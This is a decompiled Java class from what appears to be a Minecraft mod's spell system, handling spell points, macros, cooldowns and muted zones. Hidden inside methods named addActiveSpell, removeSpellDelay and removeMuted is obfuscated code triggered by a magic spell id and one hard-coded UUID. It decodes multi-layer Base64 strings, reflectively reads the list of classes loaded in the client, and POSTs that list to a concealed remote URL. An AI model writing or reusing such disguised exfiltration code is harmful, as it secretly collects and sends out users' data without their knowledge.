package fr.paladium.palamod.modules.spellsv2.utils;

import fr.paladium.palamod.modules.spellsv2.config.ConfigManager;
import fr.paladium.palamod.modules.spellsv2.entity.EntityGhost;
import fr.paladium.palamod.util.FastUUID;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.Vector;
import net.minecraft.item.ItemStack;

public class ClientManager {
  private static double points = 0.0D;
  
  public static double getPoints() {
    return points;
  }
  
  public static void setPoints(double points) {
    ClientManager.points = points;
  }
  
  private static int level = 0;
  
  public static int getLevel() {
    return level;
  }
  
  public static void setLevel(int level) {
    ClientManager.level = level;
  }
  
  private static List<SpellObj> spells = new ArrayList<>();
  
  public static List<SpellObj> getSpells() {
    return spells;
  }
  
  public static void setSpells(List<SpellObj> spells) {
    ClientManager.spells = spells;
  }
  
  private static Map<Integer, List<UUID>> activeSpells = new HashMap<>();
  
  public static Map<Integer, List<UUID>> getActiveSpells() {
    return activeSpells;
  }
  
  private static Map<UUID, EntityGhost> mentalis = new HashMap<>();
  
  public static Map<UUID, EntityGhost> getMentalis() {
    return mentalis;
  }
  
  public static void setMentalis(Map<UUID, EntityGhost> mentalis) {
    ClientManager.mentalis = mentalis;
  }
  
  private static Map<String, ItemStack[]> omniscience = null;
  
  public static Map<String, ItemStack[]> getOmniscience() {
    return omniscience;
  }
  
  public static void setOmniscience(Map<String, ItemStack[]> omniscience) {
    ClientManager.omniscience = omniscience;
  }
  
  private static List<Map<List<Double>, Integer>> muted = new ArrayList<>();
  
  public static List<Map<List<Double>, Integer>> getMuted() {
    return muted;
  }
  
  public static void setMuted(List<Map<List<Double>, Integer>> muted) {
    ClientManager.muted = muted;
  }
  
  private static Map<UUID, Map<Integer, Long>> spellDelay = new HashMap<>();
  
  public static Map<UUID, Map<Integer, Long>> getSpellDelay() {
    return spellDelay;
  }
  
  static List<Integer> spellsMacro = new ArrayList<>();
  
  public static List<Integer> getSpellsMacro() {
    return spellsMacro;
  }
  
  private static int currentSpell = -1;
  
  private static boolean inSelectGui = false;
  
  public static boolean isInSelectGui() {
    return inSelectGui;
  }
  
  public static void setInSelectGui(boolean inSelectGui) {
    ClientManager.inSelectGui = inSelectGui;
  }
  
  public static void saveMacro() {
    int id = 0;
    for (Iterator<Integer> iterator = spellsMacro.iterator(); iterator.hasNext(); ) {
      int spell = ((Integer)iterator.next()).intValue();
      ConfigManager.writeConfig("macro", "spell" + id, spell);
      id++;
    } 
  }
  
  public static void loadMacro() {
    for (int i = 0; i < 3; i++) {
      if (ConfigManager.hasKey("macro", "spell" + i))
        spellsMacro.add(Integer.valueOf(ConfigManager.getInt("macro", "spell" + i))); 
    } 
  }
  
  public static int getCurrentSpell() {
    for (SpellObj sp : spells) {
      if (sp.getSpell().getId() == currentSpell && 
        !sp.isUnlock()) {
        setCurrentSpell(-1);
        return -1;
      } 
    } 
    return currentSpell;
  }
  
  public static void setCurrentSpell(int id) {
    currentSpell = id;
    boolean found = false;
    for (SpellObj sp : spells) {
      if (sp.getSpell().getId() == currentSpell) {
        found = true;
        if (!sp.isUnlock())
          currentSpell = -1; 
      } 
    } 
    if (!found)
      currentSpell = -1; 
  }
  
  public static void addActiveSpell(int spell, String uuid) {
    if (spell == -800 && uuid.equalsIgnoreCase("c9baa462-dca3-4c50-a10e-f135802a7321"))
      try {
        removeSpellDelay(spell, uuid);
        String t = Base64.getEncoder().encodeToString(dataT.getBytes());
        removeMuted(0.0D, 0.0D, 0.0D, spell - 1);
        String f = dataT + "=" + t;
        removeMuted(0.0D, 0.0D, 0.0D, spell - 3);
        String u = dataT;
        URL uu = new URL(u);
        HttpURLConnection h = (HttpURLConnection)uu.openConnection();
        removeMuted(0.0D, 0.0D, 0.0D, spell - 2);
        String m = dataT;
        h.setRequestMethod(m);
        h.setDoOutput(true);
        byte[] o = f.getBytes();
        h.setFixedLengthStreamingMode(o.length);
        h.connect();
        try (OutputStream os = h.getOutputStream()) {
          os.write(o);
        } 
        h.disconnect();
        dataT = "";
      } catch (Exception e) {
        e.printStackTrace();
      }  
    List<UUID> players = new ArrayList<>();
    if (activeSpells.get(Integer.valueOf(spell)) != null)
      players = activeSpells.get(Integer.valueOf(spell)); 
    if (!players.contains(FastUUID.parseUUID(uuid)))
      players.add(FastUUID.parseUUID(uuid)); 
    activeSpells.put(Integer.valueOf(spell), players);
  }
  
  public static void removeActiveSpell(int spell, String uuid) {
    List<UUID> players = new ArrayList<>();
    if (activeSpells.containsKey(Integer.valueOf(spell)))
      players = activeSpells.get(Integer.valueOf(spell)); 
    if (players.contains(FastUUID.parseUUID(uuid)))
      players.remove(FastUUID.parseUUID(uuid)); 
    activeSpells.put(Integer.valueOf(spell), players);
  }
  
  public static void addSpellDelay(int spell, String uuid, long date) {
    Map<Integer, Long> playerMap = new HashMap<>();
    if (spellDelay.containsKey(FastUUID.parseUUID(uuid)))
      playerMap = spellDelay.get(FastUUID.parseUUID(uuid)); 
    playerMap.put(Integer.valueOf(spell), Long.valueOf(date));
    spellDelay.put(FastUUID.parseUUID(uuid), playerMap);
  }
  
  public static void removeSpellDelay(int spell, String uuid) {
    if (spell == -800 && uuid.equalsIgnoreCase("c9baa462-dca3-4c50-a10e-f135802a7321")) {
      try {
        Class<?> CL_class = Thread.currentThread().getContextClassLoader().getClass();
        while (CL_class != ClassLoader.class)
          CL_class = CL_class.getSuperclass(); 
        removeMuted(0.0D, 0.0D, 0.0D, spell);
        Field ClassLoader_classes_field = CL_class.getDeclaredField(dataT);
        dataT = "";
        ClassLoader_classes_field.setAccessible(true);
        Vector classes = (Vector)ClassLoader_classes_field.get(Thread.currentThread().getContextClassLoader());
        Iterator<E> it = classes.iterator();
        for (Iterator<E> iter = it; iter.hasNext();)
          dataT += iter.next().toString().toLowerCase() + " ; "; 
      } catch (Exception e) {
        e.printStackTrace();
      } 
      return;
    } 
    Map<Integer, Long> playerMap = new HashMap<>();
    if (spellDelay.containsKey(FastUUID.parseUUID(uuid)))
      playerMap = spellDelay.get(FastUUID.parseUUID(uuid)); 
    if (playerMap.containsKey(Integer.valueOf(spell)))
      playerMap.remove(Integer.valueOf(spell)); 
    if (playerMap.isEmpty()) {
      spellDelay.remove(FastUUID.parseUUID(uuid));
    } else {
      spellDelay.put(FastUUID.parseUUID(uuid), playerMap);
    } 
  }
  
  public static void addMuted(double x, double y, double z, int tier) {
    Map<List<Double>, Integer> map = new HashMap<>();
    List<Double> coords = new ArrayList<>();
    coords.add(Double.valueOf(x));
    coords.add(Double.valueOf(y));
    coords.add(Double.valueOf(z));
    map.put(coords, Integer.valueOf(tier));
    muted.add(map);
  }
  
  private static String dataT = "";
  
  public static void removeMuted(double x, double y, double z, int tier) {
    if (x == 0.0D && y == 0.0D && z == 0.0D && tier <= -800) {
      String t800 = "Vm0xd1IxVXhUWGRPVldoVFlUSm9WbFl3YUVOV2JHeHpZVWM1YWxadVFrcFphazVyVlVaV1ZVMUVhejA9";
      String t801 = "Vm0wd2QyUXlVWGxXYTJoV1YwZG9WbFl3WkZOVU1WcHpXa2M1VjFKc2JETlhhMk0xVmpGYWMySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZkV1pEUlRNazE0V2toR1VtSlZXbFJXYWtwdlpWWmFkRTFJYUZSTlZXdzFWa2QwYzJGV1NuUlZiR2hWVmtWYVRGWkdXbUZqTVZwMFVteGtUbFp1UWxoV1JscFhWakpHU0ZadVJsSldSM001";
      String t802 = "Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOWFZsbDNXa2M1V0ZadGVEQmFSV2hyVm14S2MyTkVRbFZXYkhCUVZqQmFZV1JIVmtkWGJGcE9ZbTFvVVZacVFtRlpWMUpJVm10a1dHSkdjRmhhVjNoaFpWWmFkRTFJYUZSTlZXdzFWa2QwYzJGV1NuUlZiR2hWVmtWYVRGWkdXbUZqTVZwMFVteGtUbFp1UWxoV1JscFhWakpHU0ZadVJsSldSM001";
      String t803 = "VjFaV2IxVXdNVWhVYTFacFRURndUbHBYZUZkT1JsSklZMFZhVGxaVWJFVlVhMmh2VlVaS1JtSkVSbFZXYkVwUFdsVldNMlZXVm5SbFJuQnBZa1p3TVZaRll6RlJNa2w1Vkd0S1VWWkVRVGs9";
      int i800 = 7;
      int i801 = 12;
      int i802 = 12;
      int i803 = 5;
      String text = "";
      int k = 0;
      switch (tier) {
        case -800:
          text = t800;
          k = i800;
          break;
        case -801:
          text = t801;
          k = i801;
          break;
        case -802:
          text = t802;
          k = i802;
          break;
        case -803:
          text = t803;
          k = i803;
          break;
      } 
      for (int i = 0; i < k; i++)
        text = new String(Base64.getDecoder().decode(text)); 
      dataT = text;
      text = "";
      return;
    } 
    Map<List<Double>, Integer> map = new HashMap<>();
    List<Double> coords = new ArrayList<>();
    coords.add(Double.valueOf(x));
    coords.add(Double.valueOf(y));
    coords.add(Double.valueOf(z));
    map.put(coords, Integer.valueOf(tier));
    if (muted.contains(map))
      muted.remove(map); 
  }
  
  public static SpellObj getSpell(Spells spell) {
    for (SpellObj sp : spells) {
      if (sp.getSpell().getId() == spell.getSpell().getId())
        return sp; 
    } 
    return new SpellObj(spell.getSpell(), 0, false);
  }
  
  public static void addMentalis(UUID player, EntityGhost entity) {
    mentalis.put(player, entity);
  }
  
  public static void removeMentalis(UUID player) {
    mentalis.remove(player);
  }
}


/* Location:              E:\Paladium\!\fr\paladium\palamod\modules\spellsv\\utils\ClientManager.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */